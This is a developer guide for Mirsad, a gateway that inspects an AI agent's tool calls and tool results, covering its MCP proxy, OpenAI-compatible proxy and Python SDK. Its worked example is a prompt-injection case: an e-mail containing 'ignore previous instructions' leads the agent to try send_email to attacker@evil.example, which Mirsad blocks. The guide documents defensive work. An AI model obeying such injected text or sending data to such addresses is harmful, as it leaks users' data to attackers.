# Integrating Mirsad with agents and tools

*Area: adapters (`mirsad.adapters`, `mirsad.sdk`). Owner: Bader Alshuraie.*

Mirsad (مرصاد) only protects what passes through it. This guide explains how to put the
gateway between an AI agent and its tools in the three ways Mirsad supports, how each
adapter works internally, and what the agent sees when Mirsad allows, sanitises or blocks.

| You have... | Use | Agent-side change |
|---|---|---|
| An MCP host (Claude Desktop, IDE assistants, any MCP client) | **MCP proxy** (stdio or streamable HTTP `/mcp`) | Point the host at Mirsad instead of the tool servers |
| Any agent that calls an OpenAI-compatible Chat Completions API (OpenAI SDK, LangChain, Ollama clients...) | **OpenAI-compatible proxy** `POST /v1/chat/completions` | Change `base_url` and use the agent key as `api_key` |
| A custom framework that runs tools itself | **Python SDK** (`mirsad.sdk`), `@guard` decorator | Wrap each tool function |

All three paths authenticate the agent with its **agent key** (`mk_...`, created in the
dashboard or with `mirsad agent create`) and resolve it to a *policy agent id*, which selects
the agent's section of the policy.

```mermaid
flowchart LR
    subgraph Agents
        A1[MCP host<br/>Claude Desktop]
        A2[OpenAI-style agent]
        A3[Custom framework<br/>+ Mirsad SDK]
    end
    subgraph Mirsad["Mirsad gateway"]
        P1[MCP proxy<br/>stdio / HTTP /mcp]
        P2[OpenAI proxy<br/>/v1/chat/completions]
        P3[Guard API<br/>/v1/guard/*, /v1/tools/*]
        G[Gateway pipeline<br/>policy, rate limit, taint,<br/>detector, approval, audit]
        U[UpstreamManager]
    end
    LLM[(Upstream LLM<br/>e.g. Ollama)]
    T1[(MCP servers<br/>in-process / stdio / HTTP)]
    T2[(Python function tools)]
    A1 --> P1 --> G
    A2 --> P2 --> G
    P2 --> LLM
    A3 --> P3 --> G
    G --> U --> T1
    U --> T2
```

---

## 1. Upstream tools (`mirsad.adapters.upstreams`)

The `UpstreamManager` connects to the tools being protected and offers them behind one
`list_tools()` / `call(call)` interface. `call` is the *executor* that `Gateway.execute`
runs once a call has been allowed.

### 1.1 Configuration: `configs/upstreams.yaml`

```yaml
upstreams:
  - name: workspace                      # unique; letters, digits, _ . -
    transport: inprocess                 # import an MCPServer / Server object from Python
    target: demo.workspace_server:server
  - name: files
    transport: stdio                     # spawn a subprocess and speak MCP on its stdin/stdout
    command: [python, -m, demo.workspace_server]   # "python" = the interpreter running Mirsad
    env: {LOG_LEVEL: WARNING}
    cwd: /srv/tools
  - name: crm
    transport: http                      # streamable HTTP MCP endpoint
    url: http://127.0.0.1:9000/mcp
    headers: {Authorization: "Bearer ${CRM_TOKEN}"}   # ${VAR} is read from the environment
    tool_prefix: "crm."                  # exposed as crm.search, crm.update, ...
    call_timeout_s: 30
```

| Key | Transports | Default | Meaning |
|---|---|---|---|
| `name` | all | required | Upstream id (shown in the dashboard and in errors) |
| `transport` | all | required | `inprocess`, `stdio` or `http` |
| `target` | inprocess | – | `package.module:attribute`; a factory function is called once |
| `command`, `env`, `cwd` | stdio | – | Process to spawn; `env` is merged over a minimal safe environment |
| `url`, `headers` | http | – | Endpoint and extra HTTP headers |
| `tool_prefix` | all | `""` | Prefix added to every tool name (avoids collisions between servers) |
| `connect_timeout_s` | all | 20 | Time allowed to connect and initialise |
| `call_timeout_s` | all | 60 | Time allowed per tool call / tool listing |
| `enabled` | all | `true` | Skip the entry without deleting it |
| `description` | all | `""` | Free text |

Unknown keys, duplicate names and missing transport fields are rejected with a readable
`UpstreamError`. A missing file gives an empty manager (logged), so Mirsad still starts.

### 1.2 Python function tools

```python
from mirsad.adapters.upstreams import UpstreamManager

upstreams = UpstreamManager.from_file("configs/upstreams.yaml")

def lookup_invoice(invoice_id: str) -> dict:
    return {"id": invoice_id, "amount_sar": 1250, "status": "paid"}

upstreams.register_python(
    "lookup_invoice", lookup_invoice, "Look up an invoice by id",
    {"type": "object", "properties": {"invoice_id": {"type": "string"}}, "required": ["invoice_id"]},
)
```

Functions may be sync or async and are called as `fn(**arguments)`. Sync functions run inline
unless `in_thread=True` (use it for blocking I/O). Python tools take precedence over MCP tools
with the same name (a warning is logged).

### 1.3 How it works

* **Result conversion.** An MCP `CallToolResult` becomes a `ToolResult`:
  `content` = the text blocks joined by newlines (embedded *text* resources are included,
  because the model would read them too); `structured` = `structuredContent` when present,
  otherwise the JSON-parsed text when it is valid JSON (so the taint tracker sees field names
  such as `from` or `customer_id`); `is_error` is preserved. Images, audio and binary resources
  cannot be inspected, so they are replaced by a short placeholder and never reach the model.
* **Errors never raise.** Unknown tools, upstream exceptions, protocol errors, timeouts and
  unreachable servers all become `ToolResult(is_error=True)` with a readable message, so they
  still flow through inspection and the audit log.
* **Connections.** Each MCP connection is owned by a dedicated background task (anyio cancel
  scopes must be entered and left by the same task). Connections open lazily on first use
  or eagerly in `start()`; a failure of one upstream does not affect the others.
* **Reconnect.** A closed transport (for example a crashed stdio server) or a timed-out call
  marks the connection broken; the *next* call reconnects. The failed call itself is **not
  retried**, because it may already have had side effects (sending an e-mail twice is worse
  than reporting an error). Failed connects back off exponentially (2 s up to 60 s) so a dead
  server cannot stall every request.
* **Tool listing cache.** The merged tool list is cached for `tools_ttl_s` (default 300 s);
  `list_tools(refresh=True)` forces a refresh, and a call to an unknown name triggers at most
  one re-list every 2 s. An unreachable upstream keeps its last known tools.
* **Event loops.** If the host process switches event loops (e.g. FastAPI's `TestClient`
  without a `with` block), connections are transparently re-opened in the new loop.
* `status()` returns per-upstream health (`connected`, `tools`, `last_error`,
  `connect_count`, `next_retry_s`) for dashboards.

---

## 2. MCP hosts (`mirsad.adapters.mcp_proxy`)

Mirsad presents itself as **one MCP server** that exposes the upstream tools visible to the
agent (policy `allow: true`) with their input schemas passed through unchanged. Every
`tools/call` is routed through `Gateway.execute` (check → run → inspect).

### 2.1 Claude Desktop (stdio proxy)

Desktop hosts launch MCP servers as local processes. `mirsad mcp-proxy` is a small stdio MCP
server that forwards to a running Mirsad gateway over HTTP (`GET /v1/tools`,
`POST /v1/tools/{tool}/invoke`), so the gateway, its dashboard and the approver app can run
on another machine.

`claude_desktop_config.json` (macOS: `~/Library/Application Support/Claude/`):

```json
{
  "mcpServers": {
    "mirsad": {
      "command": "/opt/mirsad/.venv/bin/mirsad",
      "args": ["mcp-proxy", "--url", "http://127.0.0.1:8700"],
      "env": { "MIRSAD_AGENT_KEY": "mk_xxxxxxxx_yyyyyyyyyyyyyyyy" }
    }
  }
}
```

Remove the original tool servers from the host configuration, otherwise the agent could
bypass Mirsad by calling them directly. `--session-id` pins the taint session; by default each
proxy process is one session. Logs go to stderr; stdout carries only MCP messages.

### 2.2 Streamable HTTP endpoint `/mcp`

Hosts that support remote MCP servers connect to `http://<mirsad-host>:8700/mcp` with the
agent key in a header:

```json
{
  "mcpServers": {
    "mirsad": {
      "type": "http",
      "url": "http://127.0.0.1:8700/mcp",
      "headers": { "Authorization": "Bearer mk_xxxxxxxx_yyyyyyyyyyyyyyyy" }
    }
  }
}
```

With the Python MCP SDK (v2):

```python
import httpx2
from mcp import Client
from mcp.client.streamable_http import streamable_http_client

headers = {"Authorization": "Bearer mk_...", "X-Mirsad-Session": "conversation-42"}
async with httpx2.AsyncClient(headers=headers) as http:
    async with Client(streamable_http_client("http://127.0.0.1:8700/mcp", http_client=http)) as mcp:
        tools = await mcp.list_tools()
        result = await mcp.call_tool("read_email", {"email_id": "E002"})
```

Every HTTP request is authenticated (`Authorization: Bearer mk_...` or `X-Mirsad-Key`); a
missing, invalid or disabled key gets `401` with a `WWW-Authenticate` header. One MCP server
and session manager is cached per agent, so a session id created by one agent cannot be used
by another. Both protocol eras of the MCP SDK work: handshake-era clients get stateful
sessions, 2026-era clients are served per request.

### 2.3 What the agent receives

| Situation | MCP result |
|---|---|
| Call allowed, result clean | the result text (spotlighted with data markers when the tool is untrusted) |
| Call allowed, injection found | the **sanitised** text (or a withheld notice when the policy says `block`), `isError=true` for block |
| Call denied by policy / taint / rate limit | `isError=true`, bilingual explanation with the reasons |
| Approval denied by a human or expired | `isError=true`, explanation names the approval outcome |
| Tool failed upstream | `isError=true`, the inspected error text |
| Mirsad itself failed | `isError=true`, "could not verify" notice (fail closed) |

Only the inspected *text* is returned. `structuredContent` is never forwarded, because it is
not rewritten by the sanitiser and could otherwise smuggle the original payload past it.
A typical denial (real output):

```text
[Mirsad] Tool call blocked: send_email
Decision: deny | risk: critical (0.90) | call_id: call_7119...
Why:
- Argument 'to' sends data to 'evil.example', outside the allowed domains ['najd-trading.example']. [policy/CONSTRAINT_VIOLATION]
- The destination attacker@evil.example was not given by the user or by a trusted system ... (source: read_email, call: call_0c60..., field: body) [taint/TAINT_UNTRUSTED_DESTINATION]
The action was NOT performed. Do not retry it with the same or similar arguments; tell the user what was blocked and why.

[مرصاد] تم منع استدعاء الأداة: send_email
القرار: رفض | الخطورة: حرجة (0.90)
الأسباب:
- الحقل 'to' يرسل البيانات إلى 'evil.example'، وهو خارج النطاقات المسموح بها ['najd-trading.example']. [CONSTRAINT_VIOLATION]
...
لم يتم تنفيذ الإجراء. لا تُعِد المحاولة بالمعطيات نفسها أو بمعطيات مشابهة، وأخبر المستخدم بما تم منعه وسببه.
```

Reason texts are clipped (400 characters each, at most 6 reasons) so a block message never
re-injects a long attacker payload into the model's context.

```mermaid
sequenceDiagram
    autonumber
    participant H as MCP host (agent)
    participant P as Mirsad MCP proxy
    participant G as Gateway
    participant U as Upstream MCP server
    H->>P: tools/list
    P->>U: tools/list (cached)
    P->>G: policy.visible_tools(agent, names)
    P-->>H: visible tools, schemas unchanged
    H->>P: tools/call read_email {email_id: E002}
    P->>G: execute(call)
    G->>G: policy, rate limit, taint check -> ALLOW
    G->>U: tools/call read_email
    U-->>G: e-mail containing an injection
    G->>G: detector -> sanitise, spotlight, register taint, audit
    G-->>P: GatewayResponse(result = sanitised text)
    P-->>H: sanitised, spotlighted text
    H->>P: tools/call send_email {to: attacker@evil.example}
    P->>G: execute(call)
    G->>G: TAINT_UNTRUSTED_DESTINATION -> DENY, audit
    G-->>P: GatewayResponse(decision = DENY)
    P-->>H: isError + bilingual explanation (tool never ran)
```

### 2.4 Sessions

Taint tracking is per session. The MCP proxy uses, in order: the `X-Mirsad-Session` request
header, the MCP session id (`mcp-<id>`, handshake-era HTTP clients), the proxy's
`--session-id`, or a per-process / per-agent default. Use one session per conversation.

---

## 3. OpenAI-compatible agents (`mirsad.adapters.openai_proxy`)

`POST /v1/chat/completions` accepts a standard Chat Completions request, protects it, forwards
it to the configured LLM and returns a standard response.

### 3.1 Server configuration

```bash
export MIRSAD_LLM_BASE_URL=http://127.0.0.1:11434/v1   # Ollama's OpenAI-compatible API
export MIRSAD_LLM_API_KEY=ollama                       # sent upstream as "Authorization: Bearer ..."
export MIRSAD_LLM_MODEL=qwen2.5:7b                     # used when the request has no "model"
mirsad serve
```

An agent may supply its own upstream credential with the `X-Upstream-Authorization` header
(a bare key is sent as `Bearer <key>`). The agent key is **never** forwarded to the LLM.

### 3.2 Agent side: the `openai` package

```python
from openai import OpenAI

client = OpenAI(
    base_url="http://127.0.0.1:8700/v1",     # Mirsad instead of the LLM provider
    api_key="mk_xxxxxxxx_yyyyyyyyyyyyyyyy",  # the agent key authenticates the agent to Mirsad
    default_headers={"X-Mirsad-Session": "conversation-42"},
    timeout=180,                              # longer than the approval timeout (120 s default)
)
reply = client.chat.completions.create(model="qwen2.5:7b", messages=messages, tools=tools)
```

### 3.3 Agent side: Ollama with any OpenAI client

Ollama stays where it is; only the agent's base URL changes:

```bash
curl http://127.0.0.1:8700/v1/chat/completions \
  -H "Authorization: Bearer mk_xxxxxxxx_yyyyyyyyyyyyyyyy" \
  -H "Content-Type: application/json" \
  -d '{"model": "qwen2.5:7b", "messages": [{"role": "user", "content": "اقرأ آخر رسالة في البريد"}],
       "tools": [{"type": "function", "function": {"name": "list_emails", "parameters": {"type": "object"}}}]}'
```

### 3.4 What the proxy does

1. **Inspect tool results.** Every `role: tool` message (and legacy `role: function`) is run
   through `gateway.inspect_result`; the tool name comes from the preceding assistant
   `tool_calls`. The message content is replaced by the inspected content before the request
   leaves Mirsad, so an injection inside a tool result never reaches the model unmodified.
   Results are cached per session and content hash, because clients resend the whole
   conversation every turn.
2. **Least privilege.** Tool definitions the agent's policy does not allow are removed from
   `tools` (and a `tool_choice` naming one of them is dropped).
3. **Check tool calls.** Every `tool_calls[i]` in the response is checked with
   `gateway.check_call` (which waits for a human when the policy requires approval). Denied
   calls are removed and a bilingual explanation is appended to the assistant text; when no
   call remains, `finish_reason` becomes `"stop"`. Arguments that are not a JSON object are
   denied without evaluation (fail closed).
4. **Report.** The response keeps the OpenAI shape and gains a `mirsad` object
   (`session_id`, per-call `action`/`risk`/`reasons`/`approval_id`/`audit_seq`, per-result
   inspection action) plus an `X-Mirsad-Session` header. OpenAI client libraries ignore the
   extra field.

Session id: `X-Mirsad-Session` when present, otherwise a hash of the agent id and the first
user message, which is stable across the turns of one conversation. Streaming
(`stream: true`) is rejected with `400`. Upstream errors are passed through with their status;
an unreachable LLM gives `502`, a timeout `504`.

```mermaid
sequenceDiagram
    autonumber
    participant A as Agent (OpenAI client)
    participant P as Mirsad OpenAI proxy
    participant G as Gateway
    participant L as LLM (Ollama)
    A->>P: POST /v1/chat/completions (messages incl. role:tool)
    P->>G: inspect_result(tool message) for each tool result
    G-->>P: sanitised / spotlighted content
    P->>P: replace tool content, drop tools not allowed by policy
    P->>L: forwarded request (upstream key, never the agent key)
    L-->>P: assistant message with tool_calls
    loop each tool call
        P->>G: check_call(tool, arguments)
        G-->>P: ALLOW / DENY (after approval if required)
    end
    P->>P: remove denied calls, append EN+AR explanation, finish_reason=stop if none left
    P-->>A: OpenAI-shaped response + "mirsad" report
    A->>A: executes only the remaining tool calls
```

---

## 4. Custom frameworks: the Python SDK (`mirsad.sdk`)

### 4.1 The `guard` decorator

```python
from mirsad.sdk import MirsadClient, MirsadBlocked

mirsad = MirsadClient("http://127.0.0.1:8700", api_key="mk_...", session_id="conversation-42")

@mirsad.guard
def read_email(email_id: str) -> dict:
    return mailbox.get(email_id)            # your existing tool code

@mirsad.guard(name="send_email")             # policy tool name, if it differs from the function name
def send(to: str, subject: str, body: str) -> str:
    return smtp.send(to, subject, body)

try:
    text_for_model = read_email("E002")      # str: inspected (sanitised / spotlighted) content
except MirsadBlocked as exc:
    text_for_model = str(exc)                # bilingual explanation, safe to show the model
```

The wrapper (1) binds the call's arguments, applying defaults, and asks Mirsad
`check_call`; (2) runs the function only when the decision is ALLOW; (3) sends the return value
to `inspect_result` (non-string values are serialised to JSON text, with the JSON value as
`structured`); (4) **returns the inspected text**.

> **Important.** The value returned by a guarded function is the *inspected* text, not the
> original return value. Always pass this returned value to the model. Feeding the raw value
> (for example by calling the undecorated function or reading a side channel) bypasses
> sanitisation and spotlighting.

| Exception | When | Was the tool run? |
|---|---|---|
| `MirsadBlocked` (`stage="call"`) | decision DENY (including denied / expired approvals) | no |
| `MirsadBlocked` (`stage="result"`) | result withheld by the detector (`action="block"`) | yes |
| `MirsadAuthError` | agent key missing / invalid / disabled (401/403) | no |
| `MirsadError` | gateway unreachable or other API error | no (fail closed) |

`MirsadClient.guard` keeps sync functions sync and async functions async.
`AsyncMirsadClient.guard` always returns a coroutine function.

### 4.2 Explicit API

```python
decision = mirsad.check_call("export_customers", {"query": "", "count": 500})
if decision.allowed:
    raw = crm.export(count=500)
    outcome = mirsad.inspect_result("export_customers", decision.call_id, raw)
    use(outcome.content)

response = mirsad.invoke("get_customer", {"customer_id": "C017"})   # Mirsad runs an upstream tool
openai_tools = mirsad.tools()   # OpenAI function-calling schemas of the tools this agent may use
mirsad.new_session()            # start a new taint session (new conversation)
```

`MirsadClient.from_env()` reads `MIRSAD_URL` and `MIRSAD_AGENT_KEY`. The default timeout
(150 s) is longer than the default approval timeout because `check_call` blocks while a human
decides.

```mermaid
sequenceDiagram
    autonumber
    participant F as Framework code
    participant S as @mirsad.guard
    participant M as Mirsad /v1/guard/*
    participant T as Tool function
    F->>S: read_email("E002")
    S->>M: POST /v1/guard/tool-call {tool, arguments, call_id}
    M-->>S: Decision ALLOW
    S->>T: read_email("E002")
    T-->>S: {"id": "E002", "body": "...ignore previous instructions..."}
    S->>M: POST /v1/guard/tool-result {content (JSON text), structured}
    M-->>S: InspectionOutcome (sanitize, spotlighted text)
    S-->>F: inspected text (use this, not the raw dict)
    F->>S: send("attacker@evil.example", ...)
    S->>M: POST /v1/guard/tool-call
    M-->>S: Decision DENY (taint)
    S-->>F: raises MirsadBlocked (tool not run)
```

---

## 5. Security model and design decisions

* **Inline vs. advisory enforcement.** In the MCP proxy and `POST /v1/tools/{tool}/invoke`,
  Mirsad *executes* the tool, so a denied call cannot run. In the OpenAI proxy and the SDK the
  agent runtime executes tools; Mirsad removes denied calls and raises before execution, which
  protects against a manipulated **model**, but assumes the agent **runtime** (your code) is
  honest. Prefer the inline paths when the runtime itself is not trusted.
* **Fail closed.** Any failure of Mirsad (gateway exception, unreachable gateway, unparsable
  arguments, inspection error) results in "not executed" / "output withheld", never in a
  silent pass-through.
* **No credential leakage.** Agent keys are never forwarded upstream; upstream credentials come
  from server configuration or an explicit `X-Upstream-Authorization` header.
* **Minimal echo.** Block messages clip reason texts and list only the reasons that objected.
* **Media.** Images, audio and binary resources are not forwarded because they cannot be
  inspected.

## 6. Configuration summary

| Setting | Where | Default |
|---|---|---|
| Upstreams file | `MIRSAD_UPSTREAMS_PATH` | `configs/upstreams.yaml` |
| Upstream LLM | `MIRSAD_LLM_BASE_URL`, `MIRSAD_LLM_API_KEY`, `MIRSAD_LLM_MODEL` | Ollama at `127.0.0.1:11434/v1`, `qwen2.5:7b` |
| Approval timeout | `MIRSAD_APPROVAL_TIMEOUT_S` | 120 s (client timeouts must be longer) |
| Stdio proxy | `mirsad mcp-proxy --agent-key/$MIRSAD_AGENT_KEY --url --session-id` | `http://127.0.0.1:8700` |
| SDK | `MIRSAD_URL`, `MIRSAD_AGENT_KEY` (`from_env`) | `http://127.0.0.1:8700` |
| Tool list cache | `UpstreamManager(tools_ttl_s=...)` | 300 s |
| OpenAI proxy options | `build_openai_router(filter_tools=..., upstream_timeout_s=...)` | `True`, 300 s |

## 7. Testing

`tests/adapters/` (run with `pytest tests/adapters`) contains 78 tests that use the real MCP
SDK v2 and small fakes for the other areas:

* `test_adapters_upstreams.py` — configuration validation, in-process / stdio (subprocess,
  including crash and reconnect) / streamable-HTTP (uvicorn) upstreams, result conversion,
  Python tools, listing cache, timeouts, backoff, event-loop change.
* `test_adapters_mcp_proxy.py` — policy-filtered listing, allow / sanitise / deny / human-denied
  / result-blocked / error paths end to end through `mcp.Client`, the authenticated HTTP endpoint
  for both protocol eras with per-agent servers, the remote proxy logic with mocked HTTP, and a
  real `run_stdio_proxy` subprocess talking to a live HTTP API.
* `test_adapters_openai_proxy.py` — tool-message inspection, inspection cache, tool filtering,
  tool-call removal and partial denial, malformed arguments, fail-closed paths, session ids,
  upstream authorisation, error pass-through, the fallback agent-key dependency.
* `test_adapters_sdk.py` — explicit API and `guard` (sync, async, methods, name override,
  blocked call, blocked result, unreachable gateway) against a minimal FastAPI app that
  implements the guard endpoints.

## 8. Limitations

* The OpenAI proxy does not support streaming responses (`stream: true` → 400).
* In the OpenAI proxy and SDK paths the agent runtime executes the tools (see section 5).
* Session ids are asserted by the client (`X-Mirsad-Session`). A runtime that rotates session
  ids on every call weakens cross-call taint tracking; the default OpenAI session (hash of the
  first user message) cannot be influenced by the model.
* Without `X-Mirsad-Session`, 2026-era (stateless) MCP HTTP clients of one agent share one
  taint session; this errs on the side of over-blocking, not under-blocking.
* Upstream MCP resources, prompts and sampling are not proxied; only tools are.
* A timed-out or interrupted upstream call is reported as an error and never retried
  automatically; for stdio upstreams the next call restarts the server process.
* Non-text MCP content (images, audio, binary resources) is dropped rather than inspected.
